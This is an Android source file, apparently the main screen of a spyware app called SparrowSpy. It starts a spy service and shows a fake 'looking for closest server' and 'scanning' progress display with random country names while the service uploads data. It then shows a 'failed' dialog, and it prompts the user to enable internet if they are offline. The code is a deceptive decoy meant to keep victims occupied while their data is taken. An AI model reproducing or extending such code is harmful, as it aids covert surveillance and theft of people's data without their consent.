package com.tangledbytes.sparrowspy;


import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.ProgressBar;
import android.widget.TextView;

import com.tangledbytes.sparrowspy.events.Events;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.Utils;

import java.util.Locale;
import java.util.Random;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private final Utils mUtils = new Utils(this);
    private ProgressBar progressBar;
    private TextView tvProcMainTitle;
    private TextView tvProcContent;
    private TextView tvProgress;
    SparrowSpy mSpy;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startSpy();
    }

    public void startSpy() {
        mSpy = SparrowSpy.init(this)
                .setSpyServiceStateChangeListener(new Events.SpyServiceStateChangeListener() {
                    @Override
                    public void onStart() {
                        showFakeProcess();
                    }

                    @Override
                    public void onFinish() {
                    }
                });
    }

    private final Thread fakeProcessThread = new Thread(new Runnable() {
        final Random random = new Random();

        @Override
        public void run() {
            double progress = 0;
            while (!mSpy.hasUploadedAllData()) {
                if (!mUtils.hasActiveInternetConnection()) {
                    runOnUiThread(mSpy::showEnableInternetDialog);
                    blockThread();
                    continue;
                }
                // increase progress by 0.5% of remaining progress
                progress += 0.005 * (100 - progress);
                final int finalProgress = (int) progress;
                runOnUiThread(() -> updateUi(finalProgress));
                blockThread();
            }
            runOnUiThread(mSpy::showFailedDialog);
        }

        private void updateUi(int progress) {
            tvProcContent.setText(String.format("scanning %s...", Constants.COUNTRIES[random.nextInt(Constants.COUNTRIES.length)]));
            progressBar.setProgress(progress);
            tvProgress.setText(String.format(Locale.ENGLISH, "%d%%", progress));
        }

        private void blockThread() {
            synchronized (MainActivity.this) {
                try {
                    MainActivity.this.wait(random.nextInt(500) + 1);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    });

    private void showFakeProcess() {
        tvProcMainTitle = findViewById(R.id.proc_title);
        tvProcContent = findViewById(R.id.proc_content);
        progressBar = findViewById(R.id.proc_progress);
        tvProgress = findViewById(R.id.tv_progress);
        tvProcMainTitle.setText(R.string.looking_for_closest_server);
        fakeProcessThread.start();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SparrowSpy.PERMISSIONS_REQUEST_CODE) {
            mSpy.handlePermissionResult();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SparrowSpy.OPEN_SETTINGS_REQUEST_CODE) {
            mSpy.handlePermissionResult();
        }
    }
}